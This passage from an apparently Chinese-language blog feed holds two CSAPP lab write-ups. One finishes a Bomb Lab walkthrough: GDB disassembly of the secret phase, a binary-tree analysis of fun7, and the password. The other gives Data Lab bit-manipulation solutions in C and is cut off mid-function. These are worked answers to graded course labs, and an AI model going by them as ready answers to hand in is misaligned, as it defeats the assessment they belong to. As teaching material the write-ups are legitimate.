&lt;phase_defused+144&gt;0x000000000040164f &lt;+139&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;0x0000000000401654 &lt;+144&gt;:   add    $0x78,%rsp0x0000000000401658 &lt;+148&gt;:   ret</code></pre><p>和之前的做法一样，将汇编代码翻译为 C 语言风格的伪代码，同时打印程序中用到的一些字符串：</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp.png"></p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rax &#x3D; Mem[%fs + 0x28];Mem[%rsp + 0x68] &#x3D; %rax;if (Mem[%rip + 0x202181] &#x3D;&#x3D; 6) &#123; &#x2F;&#x2F; num_input_strings%r8 &#x3D; %rsp + 0x10;%rcx &#x3D; %rsp + 0xc;%rdx &#x3D; %rsp + 0x8;%rdi &#x3D; 0x603870;sscanf(%rdi, &quot;%d %d %s&quot;, %rdx, %rcx, %r8);if (%eax &#x3D;&#x3D; 3) &#123;%rdi &#x3D; %rsp + 0x10;if (strings_not_equal(%rdi, &quot;DrEvil&quot;) &#x3D;&#x3D; 0) &#123;puts(&quot;Curses, you&#39;ve found the secret phase!&quot;);puts(&quot;But finding it and solving it are quite different...&quot;);%eax &#x3D; 0;secret_phase();&#125;&#125;puts(&quot;Congratulations! You&#39;ve defused the bomb!&quot;);&#125;%rax &#x3D; Mem[%rsp + 0x68];if (%rax !&#x3D; Mem[%fs + 0x28]) &#123;__stack_chk_fail();&#125;</code></pre><p>仔细分析上述代码的逻辑，当输入的字符串个数等于 6 时，即解决了 phase_1 ~ phase_6 所有关卡后，程序调用 <code>sscanf</code> 从地址 <code>0x603870</code> 处读取以空格分隔的两个整数和一个字符串，分别存入寄存器 <code>%rdx</code>、<code>%rcx</code> 和 <code>%r8</code> 中，当函数返回值为 3，即成功匹配了 3 个值，且匹配到的第三个值（字符串）等于 &quot;DrEvil&quot; 时，即可进入隐藏关卡。</p><p>但是上面我们已经打印了地址 <code>0x603870</code> 处的字符串，为 <code>3 0</code>，只有两个，无法使得匹配数为 3. 我最开始想到的解决方法就是在调试过程中手动更改该地址处的值，但是这样的做法也只具备调试作用，进入隐藏关卡密码仍然无法得到。</p><p>换个角度来思考，这个 <code>3 0</code> 有没有可能不是硬编码的数据，而是我们手动输入的？记得之前 <code>phase_4</code> 的正确密码之一就是 <code>3 0</code>。</p><p>将断点设置在 phase_4 处，并打印 <code>%rdi</code> 寄存器的值， 发现正好就是 <code>0x603870</code>，因此 phase_4 的完整密码应该是 <code>3 0 DrEvil</code> （正如前面所说，前两位也可以是 <code>1 0</code>、<code>7 0</code> 等）。</p><blockquote><p>注意末尾的 DrEvil 在 phase_4 中并不会被读取，因为模式字符串为 “%d %d”，因此匹配成功的值最多为 2，不会影响 <code>cmp  $0x2, %eax</code> 的判断。</p></blockquote><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-2.png"></p><p>经过前面的准备，终于可以着手解决隐藏关卡了，相信有了前面这些关卡的锻炼，隐藏关卡不会显得太难。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401242 &lt;+0&gt;:     push   %rbx0x0000000000401243 &lt;+1&gt;:     call   0x40149e &lt;read_line&gt;0x0000000000401248 &lt;+6&gt;:     mov    $0xa,%edx0x000000000040124d &lt;+11&gt;:    mov    $0x0,%esi0x0000000000401252 &lt;+16&gt;:    mov    %rax,%rdi0x0000000000401255 &lt;+19&gt;:    call   0x400bd0 &lt;strtol@plt&gt;0x000000000040125a &lt;+24&gt;:    mov    %rax,%rbx0x000000000040125d &lt;+27&gt;:    lea    -0x1(%rax),%eax0x0000000000401260 &lt;+30&gt;:    cmp    $0x3e8,%eax0x0000000000401265 &lt;+35&gt;:    jbe    0x40126c &lt;secret_phase+42&gt;0x0000000000401267 &lt;+37&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040126c &lt;+42&gt;:    mov    %ebx,%esi0x000000000040126e &lt;+44&gt;:    mov    $0x6030f0,%edi0x0000000000401273 &lt;+49&gt;:    call   0x401204 &lt;fun7&gt;0x0000000000401278 &lt;+54&gt;:    cmp    $0x2,%eax0x000000000040127b &lt;+57&gt;:    je     0x401282 &lt;secret_phase+64&gt;0x000000000040127d &lt;+59&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401282 &lt;+64&gt;:    mov    $0x402438,%edi0x0000000000401287 &lt;+69&gt;:    call   0x400b10 &lt;puts@plt&gt;0x000000000040128c &lt;+74&gt;:    call   0x4015c4 &lt;phase_defused&gt;0x0000000000401291 &lt;+79&gt;:    pop    %rbx0x0000000000401292 &lt;+80&gt;:    ret</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">read_line();strtol(%rax, 0, 0xa);%rbx &#x3D; %rax;%eax &#x3D; %rax - 1;if (%eax &gt; 0x3e8) &#123;  &#x2F;&#x2F; 无符号比较explode_bomb();&#125;fun7(0x6030f0, %ebx);if (%eax !&#x3D; 2) &#123;explode_bomb();&#125;puts(0x402438);phase_defused();</code></pre><p>可以看到，隐藏关卡的代码逻辑还是比较清晰的：读取一行，应该是隐藏关卡的密码，将其转换为 <code>long</code> 类型，然后又是和之前类似的范围限定语句，随后调用函数 <code>fun7</code>，如果返回值为 2，则密码输入正确。</p><p>问题的关键还是在于函数 <code>fun7</code>，其代码如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401204 &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000401208 &lt;+4&gt;:     test   %rdi,%rdi0x000000000040120b &lt;+7&gt;:     je     0x401238 &lt;fun7+52&gt;0x000000000040120d &lt;+9&gt;:     mov    (%rdi),%edx0x000000000040120f &lt;+11&gt;:    cmp    %esi,%edx0x0000000000401211 &lt;+13&gt;:    jle    0x401220 &lt;fun7+28&gt;0x0000000000401213 &lt;+15&gt;:    mov    0x8(%rdi),%rdi0x0000000000401217 &lt;+19&gt;:    call   0x401204 &lt;fun7&gt;0x000000000040121c &lt;+24&gt;:    add    %eax,%eax0x000000000040121e &lt;+26&gt;:    jmp    0x40123d &lt;fun7+57&gt;0x0000000000401220 &lt;+28&gt;:    mov    $0x0,%eax0x0000000000401225 &lt;+33&gt;:    cmp    %esi,%edx0x0000000000401227 &lt;+35&gt;:    je     0x40123d &lt;fun7+57&gt;0x0000000000401229 &lt;+37&gt;:    mov    0x10(%rdi),%rdi0x000000000040122d &lt;+41&gt;:    call   0x401204 &lt;fun7&gt;0x0000000000401232 &lt;+46&gt;:    lea    0x1(%rax,%rax,1),%eax0x0000000000401236 &lt;+50&gt;:    jmp    0x40123d &lt;fun7+57&gt;0x0000000000401238 &lt;+52&gt;:    mov    $0xffffffff,%eax0x000000000040123d &lt;+57&gt;:    add    $0x8,%rsp0x0000000000401241 &lt;+61&gt;:    ret</code></pre><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> z <span class="token operator">=</span> <span class="token operator">*</span>x<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>z <span class="token operator">></span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>z <span class="token operator">==</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>又是一个递归函数，不过和 phase_4 不同，这个函数的代码显得很有规律，看到 <code>*(x + 8)</code> 和 <code>*(x + 16)</code> 这样的表达式很容易想到可能又是某种链接结构，不妨打印 <code>0x6030f0</code> 处的内容：</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-3.png"></p><p>这下结果很明确了，每个结点包含两个链接（指针）域，没错，正是二叉树。为了分析的方便，我根据上图的数据内容绘制了一个等价的二叉树，如下图所示：</p><blockquote><p>可以看到，每个结点由 4 个 8 字节组成，前三个应该分别是值域、左孩子、右孩子，最后一个全为 0 的 8 字节貌似很多余，个人推测应该是 C 语言结构体的 <strong>字节对齐</strong> 导致的。</p></blockquote><p><img src="/2024/09/17/CSAPP-Bomb-Lab/btree.png"></p><p>最后再回到函数 fun7 中，要使得最终结果等于 2，一种可能的计算方法如下：</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/formu.png"></p><p>我们只需要保证二叉树遍历时依次遍历左孩子、右孩子、左孩子，且输入密码正好等于叶子结点即可，<code>0x14</code> 正好就满足条件，因此隐藏关卡的密码为 20.</p><p>至此，”炸弹“ 成功被”拆除“。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;p&gt;本 Lab 可以说是 CSAPP 的几个 Lab 中最为人津津乐道的一个，对应知识点为书中的第 3 章（程序的机器级表示），要求使用 GDB 调试器，对汇编语言进行调试，从而得出正确的“拆弹密码”。共分为 6 个关卡和一个隐</summary>
      
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="汇编语言" scheme="http://lordaeronesz.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Data Lab</title>
    <link href="http://lordaeronesz.github.io/2024/08/31/CSAPP-Data-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/08/31/CSAPP-Data-Lab/</id>
    <published>2024-08-31T03:45:11.000Z</published>
    <updated>2024-09-01T07:30:08.529Z</updated>
    
    <content type="html"><![CDATA[<p>CSAPP 的第一个 Lab，对应知识点为书中的第 2 章（信息的表示与处理），要求使用受限制的运算符和表达式实现一些位操作。主要分为两个部分：整数部分和浮点数部分。其中整数部分限制较多，比较偏重技巧性，部分题个人认为很有难度。而浮点数部分则比较基础，主要考察对 IEEE 754 标准的熟悉程度，代码较长，但思路相对简单。</p><span id="more"></span><h1 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>使用德-摩根定律进行推导，推导过程如下：</p><p><img src="/2024/08/31/CSAPP-Data-Lab/formu.png"></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">bitXor</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 德-摩根定律</span>    <span class="token keyword">return</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token operator">~</span>y<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span>x <span class="token operator">&amp;</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>最小整数即最高位（负数权重）为 1，其余（正数权重）为 0。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">tmin</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">31</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>由于不能使用左移运算符，因此没办法直接构造出 tmax，需要仔细考虑 tmax 的性质：<code>tmax = 0x7fffffff</code> ，而 <code>tmax + 1 = 0x80000000</code> ，这两个数的二进制位完全互补，因此满足：<code>tmax + tmax + 1 = 0xffffffff</code>，结果全为 1，对该结果取反即可得到 0，取非得到 1。</p><p>但这里还要考虑一个特殊情况：当 <code>x = 0xffffffff</code> 时，<code>x + 1 + x</code> 也满足等于 <code>0xffffffff</code>，因此需要借助异或运算进行特判。</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isTmax</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> case1 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// case = x == 0xffffffff ? 1 : 0;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">!</span>case1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>首先构造一个掩码 mask，奇数位全为 1，偶数位全为 0。将 mask 与 x 进行按位与，如果 x 的奇数位全为 1，那么按位与的结果仍然为 mask。然后便可以借助异或和非的组合，将结果转换为 0 或 1。</p><h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">allOddBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> mask <span class="token operator">=</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>            <span class="token comment">// mask = 0x000000aa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0x0000aaaa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0x00aaaaaa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0xaaaaaaaa</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">^</span> mask<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h1><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>补码表示法的重要特性，取反加一即可。</p><h2 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">negate</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">~</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h1><h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><p>这里我用了比较笨的逐位判断的方法。首先判断第 4 到第 31 位是否为 0x3，然后只需要关注低 4 位的二进制表示了：若第 3 位为 0，则一定位于指定范围之内，再加上两个特例（1000 和 1001）即可。</p><p>最后将运算符的个数刚好卡在 15 个，勉强过关。</p><h2 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isAsciiDigit</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 0011 0000 &lt;= x &lt;= 0011 1001</span>    <span class="token keyword">int</span> high <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 4 ~ 31 位是否为 0x3</span>    <span class="token keyword">int</span> case1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x1</span><span class="token punctuation">;</span>   <span class="token comment">// bit3 = 0</span>    <span class="token keyword">int</span> case2 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// bit0~3 = 1000</span>    <span class="token keyword">int</span> case3 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// bit0~3 = 1001</span>    <span class="token keyword">return</span> high <span class="token operator">&amp;</span> <span class="token punctuation">(</span>case1 <span class="token operator">|</span> case2 <span class="token operator">|</span> case3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h1><h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><p>很容易想到根据 x 的值是否非 0 构造出全 0 或者全 1 的数据 flag，然后将 flag 和 flag 取反后的值分别与 y 和 z 进行按位与，这样必然得到两个数：一个为 y 或 z 本身，另一个为 0，再将结果按位或即可。</p><p>构造的方法比较巧妙，需要注意到全 0 和全 1 分别代表整数 0 和 -1，它们分别是 0 和 1 的相反数，而 0 和 1 我们可以根据表达式是否非 0，使用非运算符构造出来，再将构造的结果取反加一即可。</p><h2 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">conditional</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">!</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token comment">// flag = x ? 0 : -1;</span>    <span class="token keyword">int</span> yp <span class="token operator">=</span> <span class="token operator">~</span>flag <span class="token operator">&amp;</span> y<span class="token punctuation">;</span>       <span class="token comment">// flag = 0, yp = y; flag = -1, yp = 0;</span>    <span class="token keyword">int</span> zp <span class="token operator">=</span> flag <span class="token operator">&amp;</span> z<span class="token punctuation">;</span>        <span class="token comment">// flag = 0, zp = 0; flag = -1, zp = z;</span>    <span class="token keyword">return</span> yp <span class="token operator">|</span> zp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h1><h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><p>判断两个数的大小关系，很容易想到使用作差的方法，判断 <code>x + ~y + 1</code> 的结果是否小于等于 0，即全为 0 或者最高位为 1。</p><p>不过这里还需要考虑溢出：由于同号相减必定不会导致溢出，因此我们只需要考虑异号的情况。而如果两个数异号，那它们之间的大小关系就显而易见了。</p><h2 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isLessOrEqual</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sign1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// sign1 = (x &lt; 0 &amp;&amp; y > 0) ? 1 : 0;</span>    <span class="token keyword">int</span> sign2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// sign2 = (x > 0 &amp;&amp; y &lt; 0) ? 1 : 0;</span>    <span class="token keyword">int</span> z <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token operator">~</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                             <span class="token comment">// z = x - y</span>    <span class="token keyword">int</span> sub <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// z &lt;= 0    </span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>sub <span class="token operator">|</span> sign1<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">!</span>sign2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h1><h2 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h2><p>这题从二进制位的角度不好思考，不妨从其表示的十进制数的角度出发：</p><p>当 x = 0 时，<code>-x = x</code> ，即 x 和 -x 的最高位相同，都为 0；当 x != 0 时，x 和 -x 的最高位必定有一个为 1。</p><p>可以利用这一特性将 <code>x | nx</code> 右移 31 位，由于整数进行的是符号右移，因此当最高位为 0 时，右移的结果全为 0，当最高位为 1 时，右移的结果全为 1。再将右移结果加 1，即可构造出 1 或者 0，且刚好与零和非零对应。</p><h2 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">logicalNeg</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> nx <span class="token operator">=</span> <span class="token operator">~</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">|</span> nx<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h1><h2 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h2><p>这题看到限制 90 个运算符就给吓着了，实际上也确实很困难，自己想了半天也没有思路，于是在网上参考了别人的解法，感觉相当精妙，在这里介绍一番：</p><p>对于正整数 x 而言，可以使用二分搜索的方式来确定所需的位数。首先判断 x 是否需要 16 位来表示，即 x 右移 16 位是否为 0，如果是，则右移 16 位，否则不做处理，然后再判断是否需要 8 位来处理，以此类推。最后将上述过程中的右移次数累加起来再加一（正整数首位需要为 0），即为总共需要的位数。</p><p>对于负整数 x 而言，它所需的位数与 x 取反得到的整数所需位数相同，证明没整明白。。。</p><h2 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">howManyBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> absx <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> x<span class="token punctuation">;</span>    <span class="token keyword">int</span> b16<span class="token punctuation">,</span> b8<span class="token punctuation">,</span> b4<span class="token punctuation">,</span> b2<span class="token punctuation">,</span> b1<span class="token punctuation">,</span> b0<span class="token punctuation">;</span>    <span class="token comment">// 二分搜索</span>    b16 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b16<span class="token punctuation">;</span>    b8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b8<span class="token punctuation">;</span>    b4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b4<span class="token punctuation">;</span>    b2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b2<span class="token punctuation">;</span>    b1 <span class="token operator">=</span> <span class="token 